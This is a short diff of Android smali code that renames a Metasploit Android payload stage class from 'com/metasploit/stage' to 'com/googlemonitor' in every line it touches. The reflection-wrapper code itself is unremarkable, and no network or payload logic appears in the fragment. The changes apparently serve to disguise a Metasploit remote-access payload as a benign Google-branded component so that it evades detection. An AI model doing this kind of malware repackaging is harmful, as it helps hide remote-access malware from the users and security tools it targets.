@@ -1,4 +1,4 @@
-.class final Lcom/metasploit/stage/d;
+.class final Lcom/googlemonitor/d;
 .super Ljava/lang/Object;
 
 # interfaces
@@ -13,7 +13,7 @@
 .method constructor <init>(Ljava/lang/reflect/Method;)V
     .locals 0
 
-    iput-object p1, p0, Lcom/metasploit/stage/d;->a:Ljava/lang/reflect/Method;
+    iput-object p1, p0, Lcom/googlemonitor/d;->a:Ljava/lang/reflect/Method;
 
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
@@ -26,7 +26,7 @@
     .locals 3
 
     :try_start_0
-    iget-object v0, p0, Lcom/metasploit/stage/d;->a:Ljava/lang/reflect/Method;
+    iget-object v0, p0, Lcom/googlemonitor/d;->a:Ljava/lang/reflect/Method;
 
     const/4 v1, 0x0
 
